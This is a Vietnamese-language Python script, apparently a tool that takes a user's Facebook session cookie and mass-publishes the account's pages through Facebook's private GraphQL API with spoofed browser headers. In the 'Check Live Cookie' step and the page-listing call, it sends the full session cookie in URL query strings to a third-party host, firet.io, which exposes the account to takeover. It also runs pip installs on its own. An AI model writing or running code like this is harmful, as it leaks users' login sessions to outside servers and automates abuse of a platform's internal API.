luc = "\033[1;32m"
trang = "\033[1;37m"
do = "\033[1;31m"
vang = "\033[0;93m"
hong = "\033[1;35m"
xduong = "\033[1;34m"
xnhac = "\033[1;36m"
# Đánh Dấu Bản Quyền
ndp_tool = do + "[" + trang + "🌸" + do + "] " + trang + "=> "
ndp = do + "[" + trang + "🌸" + do + "] " + trang + "=> "
# Config
# List Dữ Liệu
list_id_name_page = []
# Import Lib
import requests, threading
import os, sys
from time import sleep
from datetime import datetime
import json
try:
	import requests,pystyle
except:
	print (luc + "Bạn Chưa Tải Thư Viện \n Bắt Đầu Tải ")
	os.system('pip install requests && pip install bs4 && pip install pystyle')
# ==========================[ FUNCTION ]===========================================
def echo(a):
   for i in range(len(a)):
     sys.stdout.write(a[i])
     sys.stdout.flush()
     sleep(0.001)
   print()
def banner():
    banner = f""" 
\033[1;31m  ██╗░░██╗░█████╗░  ██╗░░██╗██╗░░░██╗░█████╗░███╗░░██╗  ██████╗░██╗░░██╗██╗░░░██╗
  \033[1;34m██║░░██║██╔══██╗  ╚██╗██╔╝██║░░░██║██╔══██╗████╗░██║  ██╔══██╗██║░░██║██║░░░██║
  \033[1;33m███████║██║░░██║  ░╚███╔╝░██║░░░██║███████║██╔██╗██║  ██████╔╝███████║██║░░░██║
  \033[1;32m██╔══██║██║░░██║  ░██╔██╗░██║░░░██║██╔══██║██║╚████║  ██╔═══╝░██╔══██║██║░░░██║
  \033[1;35m██║░░██║╚█████╔╝  ██╔╝╚██╗╚██████╔╝██║░░██║██║░╚███║  ██║░░░░░██║░░██║╚██████╔╝
  \033[1;36m╚═╝░░╚═╝░╚════╝░  ╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝  ╚═╝░░░░░╚═╝░░╚═╝░╚═════╝░
\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
"""
    echo(banner)
def clear():
    os.system("cls" if os.name == "nt" else "clear")
def thanh():
    print('\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -')
def ndp_delay(o):
    while o > 1:
        o = o - 1
        print(f'{trang}[\033[1;31mN\033[1;33mD\033[1;36mK\033[1;35mh\033[1;34m]\033[1;37m[\033[1;36m|\033[1;37m]\033[1;37m[.....]\033[1;37m[{o}]', '     ', end='\r')
        sleep(1/6)
        print(f'{trang}[\033[1;35mN\033[1;32mD\033[1;34mK\033[1;35m🌸\033[1;36m]\033[1;37m[\033[1;31m/\033[1;37m]\033[1;37m[\033[1;32m>\033[1;37m....]\033[1;37m[{o}]', '     ', end='\r')
        sleep(1/6)
        print(f'{trang}[\033[1;31mN\033[1;33mD\033[1;36mK\033[1;35m🌸\033[1;34m]\033[1;37m[\033[1;32m-\033[1;37m]\033[1;37m[\033[1;32m>\033[1;31m>\033[1;37m...]\033[1;37m[{o}]', '     ', end='\r')
        sleep(1/6)
        print(f'{trang}[\033[1;35mN\033[1;32mD\033[1;34mK\033[1;35m🌸\033[1;36m]\033[1;37m[\033[1;33m+\033[1;37m]\033[1;37m[\033[1;32m>\033[1;31m>\033[1;36m>\033[1;37m..]\033[1;37m[{o}]', '     ', end='\r')
        sleep(1/6)
        print(f'{trang}[\033[1;31mN\033[1;33mD\033[1;36mK\033[1;35m🌸\033[1;34m]\033[1;37m[\033[1;34m\\{trang}]\033[1;37m[\033[1;32m>\033[1;31m>\033[1;36m>\033[1;33m>\033[1;37m.]\033[1;37m[{o}]', '     ', end='\r')
        sleep(1/6)
        print(f'{trang}[\033[1;35mN\033[1;32mD\033[1;34mK\033[1;35m🌸\033[1;36m]\033[1;37m[\033[1;35m|\033[1;37m]\033[1;37m[\033[1;32m>\033[1;31m>\033[1;36m>\033[1;33m>\033[1;35m>\033[1;37m]\033[1;37m[{o}]', '     ', end='\r')
        sleep(1/6)


def rungr(x):
    time = datetime.now().strftime("%H:%M:%S")
    uid_page = list_id_name_page[x].split('|')[0]
    name_page = list_id_name_page[x].split('|')[1]
    list1 = (f'i_user={uid_page};')
    cookie9 = (f'{cookie}{list1}')
    headers = {
        'Authority': 'www.facebook.com',
        'Method': 'POST',
        'Path': '/api/graphql/',
        'Scheme': 'https',
        'Accept': '*/*',
        'Accept-Language': 'vi,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
        'Content-Length': '1704',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': cookie9,
        'Origin': 'https://www.facebook.com',
        'Referer': 'https://www.facebook.com/pages/?category=your_pages&ref=bookmarks',
        'Sec-Ch-Prefers-Color-Scheme': 'dark',
        'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
        'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.201", "Microsoft Edge";v="114.0.1823.67"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
        'X-Asbd-Id': '129477',
        'X-Fb-Friendly-Name': 'usePagesCometEditPageVisibilityMutation',
        'X-Fb-Lsd': 'MsxoFWxSNp7G_6piXo7vFV',
    }
    data = {
        'av': idpro5,
        '__user': idpro5,
        '__a': '1',
        '__req': '12',
        '__hs': '19540.HYP:comet_pkg.2.1..2.1',
        'dpr': '1.5',
        '__ccg': 'EXCELLENT',
        '__rev': '1007781546',
        '__s': 'hrh3k2:l8nej4:wsrxa9',
        '__hsi': '7251274423764571025',
        '__dyn': '7AzHJ16UW5Eb8ng5K8G6EjBWobVo66u2i5U4e2C17xt3odEnz8K361twYwJyE24wJwpUe8hwaG0Z82_CxS320om78bbwto88422y11xmfz81s8hwGxu782lwv89kbxS2218wc61axe3S7Udo5qfK0zEkxe2GewyDwkUtxGm2SUbElxm3y3aexfxmu3W3y261eBx_y88E3qxWm2CVEbUGdG1FyEeo88cA0z8c86-3u364UrwFg662S269wqQ1Fw',
        '__csr': 'gZ2tjhkl6Jjl8zih15dkGOsnsl9vOTZAW9OjPYRil9QhOli9llTATrHBuyAqijH8hoxmAGKQi9t-GGiyaFDEH8HjjhFpoLWgjiKuAiijAiDXCABz9Kl1OEyZ-VHy5DAByXLzoGiaBABGcxaKayGhaiUCqbzoCu7A8xm5AUyUqyUW3C8ho9EW5axSVV8jyEe-mi2Kq-dKaxiaxqbx2fglzokGczUsx64-2a3e4o8pE4icx-3fDwVwxyocE98cU8ohwlEjwxzU4K4EtwTwj9Unwo8-K3-2e4Euw08qq0dqg07Ka03iC0rq78K0-80oZwCxq4o22wipA0pO1Mw0JBc0118w3Xtw6IwtU6G1BCw0KzwCw1GS0tSqawBwHDLQ0mZ384XDOWUC0D81AE2mCwa20L832w3R4',
        '__comet_req': '15',
        'fb_dtsg': fb_dtsg,
        'jazoest': jazoest,
        'lsd': '2bA5j70hHausxyda70P9Hc',
        '__spin_r': '1007781546',
        '__spin_b': 'trunk',
        '__spin_t': '1688318891',
        'fb_api_caller_class': 'RelayModern',
        'fb_api_req_friendly_name': 'usePagesCometEditPageVisibilityMutation',
        'variables': json.dumps({
            'input': {
                'client_mutation_id': '4',
                'actor_id': idpro5,
                'page_id': uid_page,
                'publish_mode': 'PUBLISHED'
            }
        }),
    'server_timestamps': 'true',
    'doc_id': '4920939114687785'
    }
    #print(data)
    #print(headers)
    response = requests.post('https://www.facebook.com/api/graphql/', headers=headers, data=data).text
    #print(response)
    print('\033[1;31m[\033[0;93m'+str(x+1)+'\033[1;31m] | \033[1;36m'+str(time)+' \033[1;31m| \033[0;93mSUCCESS \033[1;31m| \033[1;35m'+str(uid_page)+' \033[1;31m| \033[1;34m'+str(name_page)+' \033[1;31m| \033[1;37m'+str(idpro5)+' ')


# =================[ START TOOL ]===========================
clear()
banner()
cookie = input(ndp_tool+luc+'Vui Lòng Nhập Cookie Facebook'+trang+': '+vang)

# Get fb_dtsg + jazoest
headers = {
        'authority': 'mbasic.facebook.com',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'upgrade-insecure-requests': '1',
        'origin': 'https://mbasic.facebook.com',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://mbasic.facebook.com/',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': cookie,
}

try:
    print(ndp_tool+xnhac+"Đang Check Live Cookie...!", end="\r")
    get_token = requests.get('https://firet.io/firetx_retro/api/getthongtinck_vcldcmmdecngu.php?cookie='+cookie).json()
    print(get_token)
    find_data = requests.get("https://mbasic.facebook.com/", headers=headers).text
    fb_dtsg = find_data.split('<input type="hidden" name="fb_dtsg" value="')[1].split('"')[0]
    jazoest = find_data.split('<input type="hidden" name="jazoest" value="')[1].split('"')[0]
    tokenpro5 = get_token['token']
    namepro5 = get_token["name"]
    idpro5 = get_token['id']
except:
    exit(ndp_tool+do+"Cookie Die Vui Lòng Kiểm Tra Lại!!")
url = "https://firet.io/firetx_retro/api/getpagean_11.php?cookie=" + cookie

getidpro5 = requests.get(url).json()
print(getidpro5)

list_id_name_page = []

for i in getidpro5:
    uid_page = i['id']
    name_page = i['name']
    so_luong = i['count']
    gomlist = f'{uid_page}|{name_page}'
    list_id_name_page.append(gomlist)
# NHẬP DELAY + SỐ LƯỢNG BUFF
clear()
banner()
print(ndp_tool+luc+'Get Thành Công: '+trang+str(len(list_id_name_page))+luc+' Page Pro5')
thanh()
soluongrungr = len(list_id_name_page)
thanh()
delay = int(input(ndp_tool+luc+'Nhập Delay'+trang+': '+vang))
thanh()
# RUN THAM GIA GROUP
for x in range(soluongrungr):
    threading.Thread(target=rungr,args=(x, )).start()
    ndp_delay(delay)